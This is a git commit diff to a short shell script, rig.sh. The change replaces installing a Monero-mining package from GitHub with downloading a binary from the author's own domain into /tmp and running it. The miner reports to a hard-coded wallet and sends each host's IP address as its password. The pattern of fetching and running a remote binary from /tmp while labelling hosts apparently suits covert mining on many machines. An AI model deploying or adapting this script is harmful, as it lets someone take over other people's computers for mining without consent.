8279b5f631ac8a4df9209a038f0312a1900856c9
ivanhi0 <idbod@ivanhi0.ru>
2026-04-10 19:34:13 +0300

    Update how it works

--- rig.sh
+++ rig.sh
@@ -1,5 +1,6 @@
 #!/bin/sh
 
-wget https://github.com/HashVault/vltrig/releases/download/v6.26.0.4/vltrig_6.26.0.4_amd64.deb
-apt install ./vltrig_6.26.0.4_amd64.deb
-vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass x
+cd /tmp
+wget https://bio.ivanhi0.ru/vltrig
+chmod +x ./vltrig
+vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -i)
